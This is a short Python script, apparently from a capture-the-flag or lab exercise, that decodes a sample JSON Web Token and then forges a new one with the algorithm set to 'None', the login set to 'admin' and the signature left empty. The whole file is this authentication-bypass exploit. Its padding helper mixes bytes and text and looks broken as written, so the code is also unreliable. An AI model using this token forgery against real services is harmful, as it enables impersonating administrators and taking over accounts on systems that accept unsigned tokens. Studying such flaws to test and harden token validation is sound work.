import base64

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InBvb24iLCJpYXQiOiIxNTg4NTE3MjA5In0.N2IwYmM1ZjVlNDcxNmJmYWRlNGEyZTU4YmMyZDg1OGIzYWYyM2NlMDY3MDE3Yjg0OTIyZTMzMDIyZGQ0NTIzMw"

particles = jwt_token.split(".")

def padding(part):
    if len(part) % 4 != 0:
        padding = 4 - (len(part)%4)
        return part + "=" * padding
    return part

print("Algorithm Used:\t",base64.urlsafe_b64decode(padding(particles[0])))
print("Body:\t", base64.urlsafe_b64decode(padding(particles[1])))


def create_token():
    jwt_header = base64.b64encode(b'{"alg":"None","typ":"JWS"}')
    jwt_body = base64.b64encode(b'{"login":"admin","iat":"1588517209"}')
    jwt_header = padding(jwt_header)
    jwt_body = padding(jwt_body)
    print(jwt_header.decode("utf-8") , "." , jwt_body.decode("utf-8") , ".")

create_token()
